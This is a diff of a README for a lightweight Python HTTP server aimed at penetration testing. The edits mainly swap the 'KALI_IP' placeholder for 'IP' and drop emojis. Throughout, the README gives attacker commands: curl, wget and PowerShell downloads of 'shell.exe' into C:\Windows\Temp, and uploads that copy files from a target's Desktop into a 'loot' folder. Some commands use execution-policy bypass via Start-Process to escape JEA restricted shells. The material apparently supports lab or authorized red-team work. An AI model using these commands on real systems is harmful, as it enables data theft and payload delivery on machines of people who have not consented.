@@ -6,12 +6,12 @@ A lightweight HTTP server supporting file uploads, downloads, directory browsing
 
 ## Features
 
-- 📂 Browser-based directory listing
-- 📥 File download via browser or curl
-- 📤 File upload via browser form (multipart)
-- 📡 Raw POST body exfiltration (PowerShell, curl, wget)
-- 🖥️ Dark-themed web UI
-- 📋 Server-side logging of all transfers
+- Browser-based directory listing
+- File download via browser or curl
+- File upload via browser form (multipart)
+- Raw POST body exfiltration (PowerShell, curl, wget)
+- Dark-themed web UI (If that is your thing it should be)
+- Server-side logging of all transfers
 
 ---
 
@@ -34,22 +34,22 @@ python3 server.py 443 /tmp/loot
 
 **Browser:**
 ```
-http://KALI_IP:8080/filename.txt
+http://IP:8080/filename.txt
 ```
 
 **curl:**
 ```bash
-curl http://KALI_IP:8080/shell.exe -o shell.exe
+curl http://IP:8080/shell.exe -o shell.exe
 ```
 
 **PowerShell:**
 ```powershell
-(New-Object Net.WebClient).DownloadFile('http://KALI_IP:8080/shell.exe', 'C:\Windows\Temp\shell.exe')
+(New-Object Net.WebClient).DownloadFile('http://IP:8080/shell.exe', 'C:\Windows\Temp\shell.exe')
 ```
 
 **wget:**
 ```bash
-wget http://KALI_IP:8080/shell.exe
+wget http://IP:8080/shell.exe
 ```
 
 ---
@@ -57,11 +57,11 @@ wget http://KALI_IP:8080/shell.exe
 ## Uploading Files (from client to server)
 
 **Browser:**
-Navigate to `http://KALI_IP:8080` and use the upload form at the bottom of the page.
+Navigate to `http://IP:8080` and use the upload form at the bottom of the page.
 
 **curl:**
 ```bash
-curl -X POST http://KALI_IP:8080/ -F "file=@/path/to/file.txt"
+curl -X POST http://IP:8080/ -F "file=@/path/to/file.txt"
 ```
 
 ---
@@ -72,17 +72,17 @@ Useful when operating through a restricted shell or JEA endpoint.
 
 **curl:**
 ```bash
-curl -X POST http://KALI_IP:8080/loot.txt --data-binary @/path/to/file.txt
+curl -X POST http://IP:8080/loot.txt --data-binary @/path/to/file.txt
 ```
 
 **PowerShell — upload raw bytes:**
 ```powershell
-(New-Object Net.WebClient).UploadData('http://KALI_IP:8080/out.txt', [IO.File]::ReadAllBytes('C:\Users\target\Desktop\file.txt'))
+(New-Object Net.WebClient).UploadData('http://IP:8080/out.txt', [IO.File]::ReadAllBytes('C:\Users\target\Desktop\file.txt'))
 ```
 
 **PowerShell via Start-Process (JEA restricted shell):**
 ```powershell
-Start-Process powershell.exe -ArgumentList "-nop -ep bypass -c `"(New-Object Net.WebClient).UploadData('http://KALI_IP:8080/out.txt', [IO.File]::ReadAllBytes('C:\Users\target\Desktop\file.txt'))`"" -NoNewWindow -Wait
+Start-Process powershell.exe -ArgumentList "-nop -ep bypass -c `"(New-Object Net.WebClient).UploadData('http://IP:8080/out.txt', [IO.File]::ReadAllBytes('C:\Users\target\Desktop\file.txt'))`"" -NoNewWindow -Wait
 ```
 
 **PowerShell — exfil as GET request (URL encoded):**
@@ -101,10 +101,10 @@ When operating inside a JEA-constrained PowerShell endpoint with `Start-Process`
 Start-Process cmd.exe -ArgumentList "/c dir C:\Users\target\Desktop\ > C:\Windows\Temp\out.txt" -Wait -NoNewWindow
 
 # Step 2 — Exfil directory listing
-Start-Process powershell.exe -ArgumentList "-nop -ep bypass -c `"(New-Object Net.WebClient).UploadData('http://KALI_IP:8080/listing.txt', [IO.File]::ReadAllBytes('C:\Windows\Temp\out.txt'))`"" -NoNewWindow -Wait
+Start-Process powershell.exe -ArgumentList "-nop -ep bypass -c `"(New-Object Net.WebClient).UploadData('http://IP:8080/listing.txt', [IO.File]::ReadAllBytes('C:\Windows\Temp\out.txt'))`"" -NoNewWindow -Wait
 
 # Step 3 — Exfil target file directly
-Start-Process powershell.exe -ArgumentList "-nop -ep bypass -c `"(New-Object Net.WebClient).UploadData('http://KALI_IP:8080/loot.txt', [IO.File]::ReadAllBytes('C:\Users\target\Desktop\file.txt'))`"" -NoNewWindow -Wait
+Start-Process powershell.exe -ArgumentList "-nop -ep bypass -c `"(New-Object Net.WebClient).UploadData('http://IP:8080/loot.txt', [IO.File]::ReadAllBytes('C:\Users\target\Desktop\file.txt'))`"" -NoNewWindow -Wait
 ```
 
 ---
@@ -115,8 +115,8 @@ Start-Process powershell.exe -ArgumentList "-nop -ep bypass -c `"(New-Object Net
 [*] Serving /tmp/loot
 [*] Listening on 0.0.0.0:8080
 [*] Download: http://YOUR_IP:8080/filename
-[*] Exfil:    curl -X POST http://YOUR_IP:8080/out.txt --data-binary @file.txt
-[*] Upload:   Browser -> http://YOUR_IP:8080
+[*] Exfil:    curl -X POST http://IP:8080/out.txt --data-binary @file.txt
+[*] Upload:   Browser -> http://IP:8080
 [*] CTRL+C to stop
 
 [*] 192.168.1.50 - "GET / HTTP/1.1" 200 -
